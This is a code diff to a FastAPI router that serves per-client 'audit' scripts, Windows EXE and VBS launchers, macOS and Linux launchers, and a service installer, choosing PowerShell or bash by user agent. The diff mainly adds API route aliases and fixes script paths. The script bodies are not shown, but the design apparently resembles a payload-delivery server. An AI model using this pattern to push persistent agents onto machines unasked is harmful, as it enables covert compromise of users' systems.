@@ -16,6 +16,12 @@ if os.path.exists(SCRIPTS_DIR):
     router.mount("/scripts", StaticFiles(directory=SCRIPTS_DIR), name="scripts")
 
 
+def _script_path(name: str) -> str:
+    """Absolute path to a bundled script. Resolved from SCRIPTS_DIR rather than the
+    process CWD, so the handlers work whichever directory uvicorn is launched from."""
+    return os.path.join(SCRIPTS_DIR, name)
+
+
 @router.get("/", response_class=FileResponse)
 @router.get("/index.html", response_class=FileResponse)
 def serve_frontend():
@@ -33,6 +39,7 @@ def serve_frontend():
 
 
 @router.get("/check-status")
+@router.get("/api/check-status")
 def check_status(client_id: str = Query(...)):
     session = sessions.get(client_id, {"status": "pending"})
     return JSONResponse(content=session)
@@ -47,12 +54,13 @@ def get_effective_base_url(request: Request) -> str:
 
 @router.get("/sys-agent", response_class=PlainTextResponse)
 @router.get("/sys-win", response_class=PlainTextResponse)
+@router.get("/api/sys-win", response_class=PlainTextResponse)
 @router.get("/download-script", response_class=PlainTextResponse)
 def download_script(request: Request, client_id: str = Query(None)):
     base_url = get_effective_base_url(request)
     cid = client_id or "sys_" + uuid.uuid4().hex[:10]
     try:
-        with open("scripts/audit.ps1", "r") as f:
+        with open(_script_path("audit.ps1"), "r") as f:
             content = f.read()
         content = content.replace("http://127.0.0.1:8000", base_url)
         content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
@@ -63,6 +71,7 @@ def download_script(request: Request, client_id: str = Query(None)):
 
 
 @router.get("/download-exe-launcher")
+@router.get("/api/download-exe-launcher")
 @router.get("/download-exe")
 def download_exe_launcher(request: Request, client_id: str = Query(None)):
     base_url = get_effective_base_url(request)
@@ -135,6 +144,7 @@ class Program {{
 
 
 @router.get("/download-vbs-launcher")
+@router.get("/api/download-vbs-launcher")
 @router.get("/download-vbs")
 def download_vbs(
     request: Request,
@@ -162,6 +172,7 @@ def download_vbs(
 
 
 @router.get("/download-mac-launcher")
+@router.get("/api/download-mac-launcher")
 def download_mac_launcher(request: Request, client_id: str = Query(None)):
     base_url = get_effective_base_url(request)
     cid = client_id or "sys_" + uuid.uuid4().hex[:10]
@@ -195,6 +206,7 @@ def download_mac_launcher(request: Request, client_id: str = Query(None)):
 
 
 @router.get("/download-linux-launcher")
+@router.get("/api/download-linux-launcher")
 def download_linux_launcher(request: Request, client_id: str = Query(None)):
     base_url = get_effective_base_url(request)
     cid = client_id or "sys_" + uuid.uuid4().hex[:10]
@@ -229,6 +241,7 @@ def download_linux_launcher(request: Request, client_id: str = Query(None)):
 
 @router.get("/s/{client_id}", response_class=PlainTextResponse)
 @router.get("/sys-agent-mac", response_class=PlainTextResponse)
+@router.get("/api/sys-agent-mac", response_class=PlainTextResponse)
 @router.get("/sys-agent-nix", response_class=PlainTextResponse)
 @router.get("/sys-mac", response_class=PlainTextResponse)
 @router.get("/get-sys-script", response_class=PlainTextResponse)
@@ -251,7 +264,7 @@ def download_mac_script(request: Request, client_id: str = None):
     # If request is explicitly coming from Windows PowerShell / WinHTTP CLI, serve audit.ps1
     if ("powershell" in user_agent or "winhttp" in user_agent) and "curl" not in user_agent:
         try:
-            with open("scripts/audit.ps1", "r") as f:
+            with open(_script_path("audit.ps1"), "r") as f:
                 content = f.read()
             content = content.replace("http://127.0.0.1:8000", base_url)
             content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
@@ -262,7 +275,7 @@ def download_mac_script(request: Request, client_id: str = None):
 
     # Default (macOS / Linux / bash / curl)
     try:
-        with open("scripts/audit.sh", "r") as f:
+        with open(_script_path("audit.sh"), "r") as f:
             content = f.read()
         content = content.replace("http://127.0.0.1:8000", base_url)
         content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
@@ -277,7 +290,7 @@ def download_mac_script(request: Request, client_id: str = None):
 @router.get("/api/install-daemon", response_class=PlainTextResponse)
 def install_daemon(request: Request, os: str = Query("mac")):
     base_url = get_effective_base_url(request)
-    script_file = "scripts/install_service.ps1" if os in ["win", "windows"] else "scripts/install_service.sh"
+    script_file = _script_path("install_service.ps1" if os in ["win", "windows"] else "install_service.sh")
     try:
         with open(script_file, "r") as f:
             content = f.read()
